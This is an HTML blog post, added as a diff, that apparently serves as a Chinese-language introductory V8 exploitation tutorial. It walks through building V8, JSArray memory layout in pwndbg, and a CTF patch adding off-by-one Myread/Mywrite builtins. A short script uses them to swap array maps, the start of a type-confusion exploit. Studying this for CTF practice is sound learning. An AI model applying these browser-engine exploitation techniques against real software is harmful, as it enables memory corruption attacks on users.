@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="V8-Pwn入门 概述v8 是 Google 用 C++ 开发的一个开源 JavaScript 引擎.简单来说, 就是执行 js 代码的一个程序.Chromium, Node.js 都使用 v8 解析并运行 js. v8开源仓库 环境搭建 Chromium and Chromium OS use a package of scripts called depot_tools to manage c">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2025/03/04/V8-ENVIONMENT/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="V8-Pwn入门 概述v8 是 Google 用 C++ 开发的一个开源 JavaScript 引擎.简单来说, 就是执行 js 代码的一个程序.Chromium, Node.js 都使用 v8 解析并运行 js. v8开源仓库 环境搭建 Chromium and Chromium OS use a package of scripts called depot_tools to manage c">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-03-04T14:38:21.774Z">
+<meta property="article:modified_time" content="2025-03-09T13:22:42.042Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2025/03/04/V8-ENVIONMENT/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2025/03/04/V8-ENVIONMENT/","path":"2025/03/04/V8-ENVIONMENT/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91"><span class="nav-number">2.1.</span> <span class="nav-text">编译</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSS%E5%85%A5%E9%97%A8v8%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">NSS入门v8题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="nav-number">3.1.</span> <span class="nav-text">配置环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JS-Basic-Knowledge"><span class="nav-number">3.2.</span> <span class="nav-text">JS Basic Knowledge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E8%AF%AD%E6%9E%84%E9%80%A0"><span class="nav-number">3.4.</span> <span class="nav-text">原语构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95getshell"><span class="nav-number">3.5.</span> <span class="nav-text">如何getshell</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/04/V8-ENVIONMENT/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-03-04 22:38:21" itemprop="dateCreated datePublished" datetime="2025-03-04T22:38:21+08:00">2025-03-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-03-09 21:22:42" itemprop="dateModified" datetime="2025-03-09T21:22:42+08:00">2025-03-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>V8-Pwn入门</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>v8 是 Google 用 C++ 开发的一个开源 JavaScript 引擎.<br>简单来说, 就是执行 js 代码的一个程序.<br>Chromium, Node.js 都使用 v8 解析并运行 js.</p>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/v8/v8/">v8开源仓库</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><blockquote>
+<p>Chromium and Chromium OS use a package of scripts called <a target="_blank" rel="noopener" href="https://www.chromium.org/developers/how-tos/depottools"><strong>depot_tools</strong></a> to manage checkouts and code reviews.</p>
+</blockquote>
+<p>depot_tools，这个工具是专门用来搞Chromium开发的，<a target="_blank" rel="noopener" href="https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up">安装指南</a></p>
+<p>ninja，编译v8的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=/path/to/depot_tools:$PATH # 配置到环境变量里</span><br><span class="line">git clone https://github.com/ninja-build/ninja.git</span><br><span class="line">cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#x27;export PATH=$PATH:&quot;/root/ninja&quot;&#x27; &gt;&gt; ~/.bashr</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># get code</span><br><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line"># 更新第三方仓库并预编译hook</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>./tools/dev/gm.py x64.release</code> 可以使用预设的选项编译 release 版本, 将 release 换成 debug 可以编译 debug 版本. 这样编译出来的文件在 <code>./out/x64.release</code> 或者 <code>./out/x64.debug</code> 下.</p>
+<p>一般来说用默认的选项就可以. 编译这部分先这样，以后有什么要改的再来改.</p>
+<h1 id="NSS入门v8题"><a href="#NSS入门v8题" class="headerlink" title="NSS入门v8题"></a>NSS入门v8题</h1><p>给了两个文件<code>app.py</code>和<code>changes_Myread_Mwrite.diff</code></p>
+<p>这是个旧环境，照着旧环境<code>*CTF oob</code>改的，编译要用python2</p>
+<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"># 将v8版本reset和题目一致</span><br><span class="line">git apply &lt; changes_Myread_Mwrite.diff</span><br><span class="line"># 使用补丁文件</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line"># 用debug版本貌似有DCHECK的断言问题，我直接用release了</span><br></pre></td></tr></table></figure>
+
+<p>调试脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">gdb -f ./d8 \</span><br><span class="line">-ex &quot;r --allow-natives-syntax $1&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JS-Basic-Knowledge"><a href="#JS-Basic-Knowledge" class="headerlink" title="JS Basic Knowledge"></a>JS Basic Knowledge</h2><p>JS有几种基本数据类型：Undefined, Null, Boolean, String, Symbol, Number, Object.<br>数组和函数也是属于Object范畴内的。所以本节重点是分析Object类型。</p>
+<p>V8 的地址分配是对齐字长的, 所以指针的后两位是 0，为了区分指针和SMI，将指针的最后一位设为了1。</p>
+<p>先创建一个浮点数组，进gdb看看内存结构是怎么样的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//var a=[2.1];</span><br><span class="line">pwndbg&gt; job 0x11bb5630de01</span><br><span class="line">0x11bb5630de01: [JSArray]</span><br><span class="line"> - map: 0x314778b42ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x258d1bed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x11bb5630dde9 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x2b1d18a80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x078f8fcc01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x11bb5630dde9 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 2.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tele 0x11bb5630de00</span><br><span class="line">00:0000│  0x11bb5630de00 —▸ 0x314778b42ed9 ◂— 0x400002b1d18a801</span><br><span class="line">01:0008│  0x11bb5630de08 —▸ 0x2b1d18a80c71 ◂— 0x2b1d18a808</span><br><span class="line">02:0010│  0x11bb5630de10 —▸ 0x11bb5630dde9 ◂— 0x2b1d18a814</span><br><span class="line">03:0018│  0x11bb5630de18 ◂— 0x100000000</span><br><span class="line">04:0020│  0x11bb5630de20 —▸ 0x2b1d18a81cc9 ◂— 0x2b1d18a801</span><br><span class="line">05:0028│  0x11bb5630de28 ◂— 0x400000000</span><br><span class="line">06:0030│  0x11bb5630de30 ◂— 0x200000000</span><br><span class="line">07:0038│  0x11bb5630de38 ◂— 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Object都是类似的结构，有map，properties，elements，length顺序连续</p>
+<blockquote>
+<p>map：用以识别对象的类型,指向 HiddenClass 的指针<br>properties和elements是两个独立存储的FixedArray ，分别是命名属性和编号属性<br>编号属性可以用整数下标访问，又称为元素<br>由于动态的原因，命名属性不能用固定下标检索，v8使用map transition机制来表示命名属性</p>
+</blockquote>
+<p>V8用两种方式来存储<code>命名属性</code>，分别是快速属性(<strong>Fast</strong> <strong>Properties</strong>)和慢速属性(<strong>Slow Properties</strong>)&#x2F;字典模式(<strong>Dictionary Mode</strong>)。</p>
+<p>Fast Properties在每一次新增命名属性时，基于原本的Hidden class做转换，新建一个新的Hidden class，并维护两条有向边。<br>当命名属性变换多了，树形结构就不好维护，于是会转为字典属性，存储在Properties 中，通过哈希访问。</p>
+<p>具体实现和结构请去V8官方文档或其他资料寻找，本文重点在于漏洞的利用</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.wingszeng.top/v8-pwn-basics-1-jsobject/#fast-properties-and-map-transition">Wings-JSObject</a></p>
+<p><a target="_blank" rel="noopener" href="https://jhalon.github.io/chrome-browser-exploitation-1/">JS内部结构简介</a></p>
+</blockquote>
+<p>对上述内容通俗的讲就是，v8通过map来判断对象的类型</p>
+<p>上面提到过在JS里，数组也是一种Object，在访问数组时一般会连续访问，所以编号属性就会直接存放在连续内存中。<br>这里也是真正存放数组的数据的地方。</p>
+<p>V8对数组的元素类型进行了细分，PACKED_SMI_ELEMENTS(小整数)，PACKED_DOUBLE_ELEMENTS(浮点数型)，PACKED_ELEMENTS(其他), 依次包含。而且这种转换是单向的，不可复原。<br>除了元素类型，对数组空间是否全部使用也有分类：packed 表示数组空间全部使用，如<code>x = [1,2,3]</code>，而holey表示有空间未使用,如<code>x = [1,,3]</code>,同样 PACKED 到 HOLEY 也是一个单向的转换.</p>
+<p>数组也有快速模式和慢速模式, 一般来说会使用快速模式, 即数组空间连续. 如果一个数组非常稀疏, 那么 V8 将会使用慢速模式, 创建一个字典来索引元素项目.</p>
+<p>下面的是elements的内存结构，可以明显看到数据确切地存储在*elements+0x10的地方，只有<code>var a=[1.1];</code>和<code>var a=[b];//b为一个对象</code>这种情况才是这种内存结构。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x11bb5630dde9</span><br><span class="line">0x11bb5630dde9: [FixedDoubleArray]</span><br><span class="line"> - map: 0x2b1d18a814f9 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 2.1</span><br><span class="line">pwndbg&gt; tele 0x11bb5630dde8</span><br><span class="line">00:0000│  0x11bb5630dde8 —▸ 0x2b1d18a814f9 ◂— 0x2b1d18a801</span><br><span class="line">01:0008│  0x11bb5630ddf0 ◂— 0x100000000</span><br><span class="line">02:0010│  0x11bb5630ddf8 ◂— 0x4000cccccccccccd</span><br><span class="line">03:0018│  0x11bb5630de00 —▸ 0x314778b42ed9 ◂— 0x400002b1d18a801</span><br><span class="line">04:0020│  0x11bb5630de08 —▸ 0x2b1d18a80c71 ◂— 0x2b1d18a808</span><br><span class="line">05:0028│  0x11bb5630de10 —▸ 0x11bb5630dde9 ◂— 0x2b1d18a814</span><br><span class="line">06:0030│  0x11bb5630de18 ◂— 0x100000000</span><br><span class="line">07:0038│  0x11bb5630de20 —▸ 0x2b1d18a81cc9 ◂— 0x2b1d18a801</span><br><span class="line">pwndbg&gt; x /fg 0x11bb5630ddf8</span><br><span class="line">0x11bb5630ddf8: 2.1000000000000001</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>一般的题目都是给的魔改v8(当然也有直接给cve让写的)，先给你一个特定的v8版本，然后在这个v8的基础上打一些补丁</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;Myread&quot;,</span><br><span class="line">+                          Builtins::kMyread, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;Mywrite&quot;,</span><br><span class="line">+                          Builtins::kMywrite, 2, false);</span><br></pre></td></tr></table></figure>
+
+<p>先是给新加了两个函数，分别是Myread和Mywrite，其实就是把*ctf的oob分成了两个函数，分别期望1，2个参数(包括this参数)，且这两个函数不是构造函数</p>
+<p>接下来是两个函数的实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(Myread) &#123;</span><br><span class="line">+  uint32_t len = args.length(); //获取参数数量</span><br><span class="line">+  if( len &gt; 1 ) return ReadOnlyRoots(isolate).undefined_value(); // 参数过多则返回undefined</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;	// 定义一个JSReceiver用来存储this</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate,args.receiver())); // 将this参数转换为一个JSReceiver对象</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); // 再将this转换为JSArray类型</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); // 提取出this的elements，将其视为浮点类型</span><br><span class="line">+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); // 提取出this的长度并转化为整形</span><br><span class="line">+  return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); // 返回elements的第length个值，但数组的范围是0-length-1，这里有off-by-one越界读</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+BUILTIN(Mywrite) &#123;</span><br><span class="line">+  uint32_t len = args.length(); </span><br><span class="line">+  if( len &gt; 2 ) return ReadOnlyRoots(isolate).undefined_value(); </span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver; </span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate,args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+  uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+   </span><br><span class="line">+  if( len == 2) &#123;</span><br><span class="line">+    Handle&lt;Object&gt; value; </span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1))); // 将第一个参数(不this)转换为Number类型</span><br><span class="line">+    elements.set(length,value-&gt;Number()); // 将elements的第length个值设为value，同Myread，存在off-by-one越界写</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+  else&#123;</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，给出的补丁存在越界读写，根据上面提到的内存结构我们知道，elements的第length个值实际上为该对象的map，所以这两个函数分别可以读取map和写入map，接下来我们写个脚本进行测试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a=[1.3];</span><br><span class="line">var b=[a];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.Mywrite(b.Myread());</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// var a=[1.3];</span><br><span class="line">0x1faf5120ddd1: [JSArray]</span><br><span class="line"> - map: 0x0125ead82ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1401ba251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1faf5120ddb9 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3a08c1800c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0bb8ae2401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1faf5120ddb9 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.3</span><br><span class="line"> &#125;</span><br><span class="line">// var b=[a];</span><br><span class="line">0x1faf5120de09: [JSArray]</span><br><span class="line"> - map: 0x0125ead82f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1401ba251111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1faf5120ddf1 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3a08c1800c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0bb8ae2401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1faf5120ddf1 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x1faf5120ddd1 &lt;JSArray[1]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到两个数组的map分别是浮点数和其他，在执行<code>a.Mywrite(b.Myread());</code>后如下，可以看到浮点数组的map确实改为了其他</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x1faf5120ddd0</span><br><span class="line">00:0000│  0x1faf5120ddd0 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">01:0008│  0x1faf5120ddd8 —▸ 0x3a08c1800c71 ◂— 0x3a08c18008</span><br><span class="line">02:0010│  0x1faf5120dde0 —▸ 0x1faf5120ddb9 ◂— 0x3a08c18014</span><br><span class="line">03:0018│  0x1faf5120dde8 ◂— 0x100000000</span><br><span class="line">04:0020│  0x1faf5120ddf0 —▸ 0x3a08c1800801 ◂— 0x3a08c18001</span><br><span class="line">05:0028│  0x1faf5120ddf8 ◂— 0x100000000</span><br><span class="line">06:0030│  0x1faf5120de00 —▸ 0x1faf5120ddd1 ◂— 0x7100000125ead82f</span><br><span class="line">07:0038│  0x1faf5120de08 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">pwndbg&gt; tele 0x1faf5120de08</span><br><span class="line">00:0000│  0x1faf5120de08 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">01:0008│  0x1faf5120de10 —▸ 0x3a08c1800c71 ◂— 0x3a08c18008</span><br><span class="line">02:0010│  0x1faf5120de18 —▸ 0x1faf5120ddf1 ◂— 0x3a08c18008</span><br><span class="line">03:0018│  0x1faf5120de20 ◂— 0x100000000</span><br><span class="line">04:0020│  0x1faf5120de28 —▸ 0x3a08c1800561 ◂— 0x200003a08c18001</span><br><span class="line">05:0028│  0x1faf5120de30 —▸ 0x125ead82f79 ◂— 0x400003a08c18001</span><br><span class="line">06:0030│  0x1faf5120de38 ◂— 0</span><br><span class="line">07:0038│  0x1faf5120de40 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>但是使用Myread读取的是浮点数，不便于观察，于是构造辅助函数</p>
